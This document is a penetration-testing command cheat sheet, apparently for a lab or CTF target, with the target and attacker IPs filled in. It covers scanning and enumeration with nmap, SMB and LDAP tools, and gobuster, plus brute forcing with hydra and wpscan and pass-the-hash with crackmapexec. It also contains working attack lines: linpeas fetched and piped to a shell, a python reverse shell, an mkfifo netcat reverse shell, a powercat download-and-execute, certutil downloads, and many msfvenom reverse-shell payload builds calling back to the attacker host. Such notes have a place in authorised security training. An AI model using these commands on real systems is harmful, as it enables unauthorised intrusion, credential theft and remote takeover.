---
Target IP: 10.10.244.237
Attacker IP: 10.11.114.221
---
#### nmap Command
```bash
ping -c 4 10.10.244.237
# Ping sweep scan
nmap -sn 10.10.244.237
# This will do the ping scan instead of ARP on port 80
nmap -sn -PS 10.10.244.237
# We can also specify the port or port range
nmap -sn -PS22 10.10.244.237
nmap -sn -PS1-1000 10.10.244.237

# Default port scan with version detection and default script findings
nmap -sCSV --min-rate=1000 -T4 10.10.244.237 -v -oN nmap-initial.log

## 1. All port scan | add -Pn if needed 
# -Pn: Skips host discovery; assumes the host is online.
nmap -p- -sV --min-rate=1000 -T4 10.10.244.237 -v -oN nmap-all-ports.log
...
nmap -p$ports -sCSV 10.10.244.237 -v -oN nmap-services.log

# Best practice scan for UDP ports as well
sudo nmap -Pn -n 10.10.244.237 -sU --top-ports=100 --reason
...
nmap --script=nfs-ls.nse,nfs-showmount.nse,nfs-statfs.nse -p 2049 10.10.244.237
```
#### DNS Enum
```bash
# DNS Zone transfer
dig @10.10.244.237 axfr <dns_name>

# dns enum
dnsenum 10.10.244.237
```
#### SMB Enum
```bash
nmap -script=smb-vuln\* -p445 10.10.244.237

enum4linux -a 10.10.244.237 
# Enumerate using login credentials:
enum4linux -u user_name -p password 10.10.244.237
# Enumerate user list:
enum4linux -U 10.10.244.237
  
smbclient -N -L //10.10.244.237//
# Connect with a username:
smbclient //10.10.244.237/share -U username
# Connect with a workgroup:
smbclient //10.10.244.237/share --workgroup domain -U username
# Connect with a username and password:
smbclient //10.10.244.237/share -U username%password
  
crackmapexec smb 10.10.244.237 --shares
```
...
curl 10.11.114.221/linpeas.sh -o linpeas.sh
wget http://10.11.114.221/linpeas.sh -O linpeas.sh
./linpeas.sh -a > linpeas.txt #Victim
less -r linpeas.txt #Read with colors

# Local network
sudo python3 -m http.server 80 #Host
curl 10.11.114.221/linpeas.sh | sh #Victim

# Without curl
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.11.114.221/80 | sh #Victim

# Excute from memory and send output back to the host
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.11.114.221:8000/linpeas.sh | sh | nc 10.11.114.221 9002 #Victim
```
#### Crackmapexec
```bash
# General help
...
# Null session
crackmapexec smb 10.10.244.237 -u "" up ""
# Connect to target using local account
crackmapexec smb 10.10.244.237 -u 'Administrator' -p 'PASSWORD' --local-auth
# Pass the hash against a subnet
crackmapexec smb 10.10.244.237 -u administrator -H 'LMHASH:NTHASH' --local-auth
crackmapexec smb 10.10.244.237 -u administrator -H 'NTHASH'
# Bruteforcing and Password Spraying
crackmapexec smb 10.10.244.237 -u "admin" -p "password1"
crackmapexec smb 10.10.244.237 -u "admin" -p "password1" "password2"
crackmapexec smb 10.10.244.237 -u "admin1" "admin2" -p "P@ssword"
crackmapexec smb 10.10.244.237 -u user_file.txt -p pass_file.txt
crackmapexec smb 10.10.244.237 -u user_file.txt -H ntlm_hashFile.txt
```
#### Gobuster
```bash
...
gobuster dir -u http://10.10.244.237 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt
# Directory fuzzing dirlist - raft small
gobuster dir -u http://10.10.244.237 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster-v2-80.log -t 42 -b 400,404 --no-error -x php,html,txt
# Directory fuzzing dirlist - big
gobuster dir -u http://10.10.244.237 -w /usr/share/seclists/Discovery/Web-Content/big.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt
# Directory fuzzing dirlist - dir 2.3 medium
gobuster dir -u http://10.10.244.237 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-80.log -t 42 -b 400,404 --no-error -x php,html,txt

# without many options
gobuster dir -u http://10.10.244.237 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-80.log
# Exclude length
gobuster dir -u http://10.10.244.237 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --exclude-length <LENGTH> -o gobuster-v2-80.log

# Subdomain fuzzing
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.244.237
```

#### LDAP Enum
```bash
#If LDAP running some LDAP related `nmap` scripts to enumerate
nmap -n -sV --script "ldap* and not brute" 10.10.244.237

# we can run LDAP search with the naming context included to enumerate users and grep by SAM account name.
ldapsearch -x -H "ldap://10.10.244.237" -D '' -w '' -b "DC=hutch,DC=offsec" | grep sAMAccountName
...
ldapsearch -x -H "ldap://10.10.244.237" -D 'domain\username' -w 'password' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
...
#### Rev Shell
```bash
python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.11.114.221\",445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.11.114.221 LPORT=4444 -f elf -o shell

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.114.221 LPORT=4445 -f exe -o rev.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.114.221 LPORT=4445 -f exe-service -o rev-svc.exe
...
# nc revshell stealth
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.114.221 5554 >/tmp/f

# windows rev shell with powercat
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.11.114.221/powercat.ps1');powercat -c 10.11.114.221 -p 4444 -e cmd"
```
...
```bash
# Top command 
dirsearch -u http://10.10.244.237 -e php,html -x 400,500 -r -t 8 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
...
dirsearch -u http://10.10.244.237 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 403  
# Use a custom wordlist for directory and file brute-forcing: 
dirsearch -u http://10.10.244.237 -w /path/to/wordlist.txt 
# Specify file extensions to look for during the scan: 
dirsearch -u http://10.10.244.237 -e php,txt,html 
# Recursively scan subdirectories for directories and files:
dirsearch -u http://10.10.244.237 -r
# Save scan results to a file: 
dirsearch -u http://10.10.244.237 -o dirseacrh.txt 
# Specify custom HTTP headers for the requests: 
dirsearch -u http://10.10.244.237 -H "User-Agent: Mozilla/5.0"
```
#### hydra
```bash
# Basic command
hydra -l <username> -P /usr/share/wordlists/rockyou.txt <protocol>://10.10.244.237 -t 4

# For FTP
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <protocol>://10.10.244.237 -t 4

# -t :: Number of thread followed by the number

# Post web login forms
hydra -l <username> -P /usr/share/wordlists/rockyou.txt 10.10.244.237 http-post-form "/login:username=^USER^&password=^PASS^:Your username or password is incorrect."
...
hydra -I -V -f -L usernames.txt -u -P /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt 10.10.244.237 ftp
```
#### Netcat with rlwrap
```bash
...
rdesktop 10.10.244.237

# To download file in windows
certutil -urlcache -f http://10.11.114.221 path-output-file-name
...
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.114.221 LPORT=LOCAL_PORT -f msi -o malicious.msi
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.114.221 LPORT=4445 -f exe-service -o rev-svc.exe
...
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f exe > reverse.exe

# Windows Stageless reverse TCP
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f exe > reverse.exe

# Linux Staged reverse TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f elf >reverse.elf

# Linux Stageless reverse TCP
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f elf >reverse.elf
...
# Other platforms
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f elf > shell.elf
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f exe > shell.exe
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f macho > shell.macho
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f asp > shell.asp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f raw > shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f war > shell.war
$ msfvenom -p cmd/unix/reverse_python LHOST=10.11.114.221 LPORT=4242 -f raw > shell.py
$ msfvenom -p cmd/unix/reverse_bash LHOST=10.11.114.221 LPORT=4242 -f raw > shell.sh
$ msfvenom -p cmd/unix/reverse_perl LHOST=10.11.114.221 LPORT=4242 -f raw > shell.pl
$ msfvenom -p php/meterpreter_reverse_tcp LHOST=10.11.114.221 LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
...
./agent -connect 10.11.114.221:4443 -ignore-cert
...
smbmap -H 10.10.244.237

# For anonymous/guest access
smbmap -u 'guest' -p '' -H 10.10.244.237
...
smbmap -H 10.10.244.237 -u <username> -p <password>

# Scan with username and prompt for password
smbmap -H 10.10.244.237 -u <username>

# Scan with NTLM hash
smbmap -H 10.10.244.237 -u <username> -H <NTLM_hash>

# Scan with Kerberos ticket
smbmap -H 10.10.244.237 --kerberos
```
#### Crackmapexec
```bash
# SMB enumeration
crackmapexec smb 10.10.244.237 -u guest -p '' --shares

# To check the valid user and hashesh, we can use crackmapexec
crackmapexec winrm 10.10.244.237 -u <username file> -H <hash file>

```
#### Wpscan
```shell
# Enumerate WordPress version
wpscan --url http://10.10.244.237 --enumerate v
# Scan with API token
wpscan --url http://10.10.244.237 --api-token <your_api_token>
# HTTP basic authentication
wpscan --url http://10.10.244.237 --http-auth <username>:<password>
# Enumerate plugins, themes, and users
wpscan --url http://10.10.244.237 --enumerate p,t,u --plugins-detection aggressive
# Brute force usernames
wpscan --url http://10.10.244.237 --enumerate u --passwords <password_list>
# Brute force passwords for a specific user
wpscan --url http://10.10.244.237 -U <username> -P <password_list>
# Scan with a proxy
wpscan --url http://10.10.244.237 --proxy <proxy_ip:port>
# Scan for known vulnerabilities
wpscan --url http://10.10.244.237 --enumerate vp
# Enumerate plugins with vulnerability checks
wpscan --url http://10.10.244.237 --api-token YOUR_API_TOKEN --enumerate vp
# Brute force usernames
wpscan --url http://10.10.244.237 --enumerate u --passwords /path/to/passwords.txt
# Brute force password for a specific user
wpscan --url http://10.10.244.237 -U admin -P /path/to/passwords.txt
# Scan using an HTTP proxy
wpscan --url http://10.10.244.237 --proxy 127.0.0.1:8080
```
